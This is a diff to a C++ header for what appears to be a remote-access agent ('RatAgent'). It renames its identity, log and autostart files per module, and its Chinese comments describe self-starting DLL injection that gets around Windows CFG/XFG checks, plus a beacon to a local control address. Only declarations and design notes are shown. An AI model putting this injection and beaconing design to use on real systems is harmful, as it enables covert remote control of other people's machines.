@@ -32,10 +32,11 @@ bool agent_parse_args(const std::string& s, AgentRunArgs& out, std::string& err)
 // 把 argv 拼成参数串（EXE 入口用）
 std::string agent_args_from_argv(int argc, char** argv);
 
-// 默认 agent.id 路径：exe 保持历史行为（CWD 下的 agent.id）；
-// dll 用 %LOCALAPPDATA%\RatAgent\agent.id（回退 %TEMP%）
+// 默认身份文件路径：exe 为 CWD 下的 <module>.id（保留"相对 CWD"的历史行为）；
+// dll 为 %LOCALAPPDATA%\RatAgent\<module>.id（回退 %TEMP%）
+// <module> 见 module_id.h —— 文件名带模块前缀，同机多模块才不会互相覆盖身份
 std::string agent_default_id_path(bool for_dll);
-// 默认日志路径：%LOCALAPPDATA%\RatAgent\agent.log（回退 %TEMP%）
+// 默认日志路径：%LOCALAPPDATA%\RatAgent\<module>.log（回退 %TEMP%）
 std::string agent_default_log_path();
 // 把 stdout 重定向到文件（无控制台的 DLL/注入场景；会先创建目录）。成功返回 true
 bool agent_redirect_stdout(const std::string& path);
@@ -44,13 +45,13 @@ bool agent_redirect_stdout(const std::string& path);
 // 背景：现代 Windows 目标的 CFG/XFG 会拦住"把远程线程入口指向镜像内任意导出"的注入方式
 //（表现为 0xC0000409/__fastfail），但远程 LoadLibraryW 仍然可用；反射加载更是只调用
 // 入口点、完全没有参数通道。因此 DLL 形态采用"加载即自启动"：
-//   1) 有参数文件 autostart.args（内容 = agent 参数串，与 StartAgent 同语法）
+//   1) 有参数文件 <module>.autostart.args（内容 = agent 参数串，与 StartAgent 同语法）
 //      → 用文件里的参数（**优先级最高**）；
 //   2) 没有该文件 → 用内置默认配置（beacon 127.0.0.1:8080、轮询 5s；
-//      agent.id / 日志落 %LOCALAPPDATA%\RatAgent\）。
+//      <module>.id / 日志落 %LOCALAPPDATA%\RatAgent\）。
 // 参数文件路径（按顺序探测，取第一个存在的）：
-//   %LOCALAPPDATA%\RatAgent\autostart.args   （首选；DLL 默认目录）
-//   %TEMP%\RatAgent\autostart.args
+//   %LOCALAPPDATA%\RatAgent\<module>.autostart.args   （首选；DLL 默认目录）
+//   %TEMP%\RatAgent\<module>.autostart.args
 //
 // ⚠ 自启在 DllMain 之后的新线程上进行（Sleep 300ms 脱离 loader lock），而显式入口
 //（rundll32 的 Start/Stop、宿主的 StartAgent）由加载方紧接着调用，二者存在竞争：
